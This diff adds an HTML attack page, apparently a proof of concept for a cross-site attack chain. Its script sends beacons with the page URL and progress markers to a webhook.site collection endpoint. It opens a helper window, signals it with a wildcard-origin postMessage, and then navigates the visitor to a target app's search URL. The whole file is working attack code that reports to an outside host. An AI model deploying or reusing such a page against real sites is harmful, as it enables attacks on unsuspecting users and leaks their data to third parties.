@@ -1,0 +1,16 @@
+<!doctype html><html><body><script>
+(function(){
+const APP='https://7dd99b33cefc14f4.live.sbhost.io';
+const WH='https://webhook.site/c6e550b4-e693-44ab-bfc4-9a893c54021d';
+function b(t){ try{ new Image().src=WH+'?m='+encodeURIComponent(t)+'&r='+Math.random(); }catch(e){} }
+b('main-loaded|'+location.href);
+let h=null;
+try{ h=window.open(location.href.replace(/x\.html.*$/,'h.html')+'?t='+Date.now(),'_blank'); }catch(e){ b('open-err:'+e); }
+b('helper:'+(h?'ok':'null'));
+setTimeout(function(){
+  if(h){ try{ h.postMessage('go','*'); }catch(e){} }
+  b('nav-to-app');
+  location.href=APP+'/search?q=zzzznothing&r='+Math.floor(Math.random()*1e9);
+},600);
+})();
+</script></body></html>
